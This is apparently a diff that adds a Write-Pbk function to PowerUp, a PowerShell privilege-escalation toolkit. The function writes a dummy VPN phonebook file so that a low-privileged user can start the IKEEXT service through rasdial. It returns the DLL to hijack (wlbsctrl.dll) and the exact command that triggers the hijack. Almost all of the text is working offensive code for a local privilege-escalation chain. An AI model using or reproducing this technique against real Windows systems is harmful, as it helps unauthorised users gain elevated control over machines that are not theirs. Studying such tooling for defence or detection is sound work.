@@ -3429,6 +3429,54 @@ PowerUp.HijackableDLL
 }
 
 
+function Write-Pbk {
+<#
+.SYNOPSIS
+
+Writes a dummy phonebook (.pbk) file onto the disk.
+
+.DESCRIPTION
+
+The IKEEXT service is a popular target for DLL hijacking. However, low privileged user accounts
+are not able to start the service directly. One method to bypass this restriction is to create a
+phonebook file containing a dummy-VPN connection. This phonebook can then be passed to the rasdial
+command, which starts the IKEEXT service.
+
+.PARAMETER Path
+
+Path to the desired .pbk file location.
+
+#>
+
+    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
+    [CmdletBinding()]
+    Param(
+        [String]
+        [Parameter(Mandatory = $True)]
+        [ValidateNotNullOrEmpty()]
+        $Path
+    )
+
+    $DummyPbk = @'
+[IKEEXT]
+MEDIA=rastapi
+Port=VPN2-0
+Device=Wan Miniport (IKEv2)
+DEVICE=vpn
+PhoneNumber=127.0.0.1
+'@
+
+    if (Test-Path $Path) { Remove-Item -Force $Path }
+    "$DummyPbk" | Out-File -Encoding ASCII -Append $Path
+
+    $Out = New-Object PSObject
+    $Out | Add-Member Noteproperty 'PbkFile' $Path
+    $Out | Add-Member Noteproperty 'TargetDll' 'C:\Windows\System32\wlbsctrl.dll'
+    $Out | Add-Member Noteproperty 'Usage' "rasdial IKEEXT test test /PHONEBOOK:$Path"
+    $Out
+}
+
+
 ########################################################
 #
 # Registry Checks
